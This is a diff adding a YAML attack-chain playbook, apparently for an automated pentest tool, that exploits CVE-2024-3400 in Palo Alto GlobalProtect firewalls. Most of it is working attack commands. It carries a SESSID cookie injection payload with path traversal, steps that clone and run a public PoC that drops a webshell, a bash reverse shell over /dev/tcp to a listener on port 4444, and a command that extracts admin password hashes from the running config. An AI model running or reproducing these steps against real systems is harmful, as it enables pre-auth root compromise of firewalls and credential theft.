@@ -1,0 +1,65 @@
+chain_id: globalprotect_cve_2024_3400
+title: "Palo Alto GlobalProtect — CVE-2024-3400 unauth cmd injection via SESSID cookie"
+severity: CRITICAL
+tags: [web, paloalto, globalprotect, panos, cve-2024-3400, command-injection, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2024-3400" }
+    - { banner_pattern: "(?i)globalprotect|palo\\s*alto|pan-?os" }
+    - { product_pattern: "(?i)globalprotect|pan-?os" }
+    - { path_pattern: "(?i)/(global-protect|sslmgr|esp/scep)" }
+
+description: |
+  Palo Alto PAN-OS 10.2 / 11.0 / 11.1 with GlobalProtect Gateway +
+  Device Telemetry enabled: the `SESSID` cookie value is used in a
+  shell command (telemetry log path build) without sanitization. A
+  cookie like `SESSID=./../../../../../opt/panlogs/tmp/device_telemetry/$(id)`
+  forces the firewall to write the output of `id` into a file under
+  `/opt/panlogs`. Pre-auth RCE as root on the firewall.
+
+steps:
+  - id: 1
+    title: "Fingerprint GlobalProtect portal"
+    command: |
+      curl -sk -i "https://$VICTIMA/global-protect/login.esp" -I
+      curl -sk "https://$VICTIMA/global-protect/portal/css/login.css" -I
+
+  - id: 2
+    title: "Probe — write a marker file via the cookie"
+    command: |
+      curl -sk "https://$VICTIMA/ssl-vpn/hipreport.esp" \
+        -H 'Cookie: SESSID=./../../../../opt/panlogs/tmp/device_telemetry/minute/rootctl_$(id|base64)' \
+        -d 'rootctl=1'
+      # Wait ~30s; the telemetry agent picks up the filename.
+
+  - id: 3
+    title: "Public PoC drops a webshell"
+    command: |
+      git clone https://github.com/horizon3ai/CVE-2024-3400 /tmp/gp
+      python3 /tmp/gp/CVE-2024-3400.py -t https://$VICTIMA -c 'id'
+
+  - id: 4
+    title: "Reverse shell"
+    command: |
+      nc -lvnp 4444
+      python3 /tmp/gp/CVE-2024-3400.py -t https://$VICTIMA \
+        -c 'bash -c "bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"'
+
+  - id: 5
+    title: "Post — read PAN-OS XML config (admin password hashes)"
+    command: |
+      # On the firewall:
+      cat /opt/pancfg/mgmt/factory/config/running-config.xml | grep -E '(phash|password)'
+
+common_errors:
+  - error: "Cookie payload silent — no file written"
+    solution: |
+      Device Telemetry is disabled (mitigation). The cookie path still
+      reflects, but no asynchronous shell runs. Confirm telemetry
+      with `curl -sk https://$VICTIMA/api/?type=op&cmd=<show><deviceconfig><setting><device-telemetry/></setting></deviceconfig></show>`.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2024-3400
+  - https://security.paloaltonetworks.com/CVE-2024-3400
+  - https://unit42.paloaltonetworks.com/cve-2024-3400/
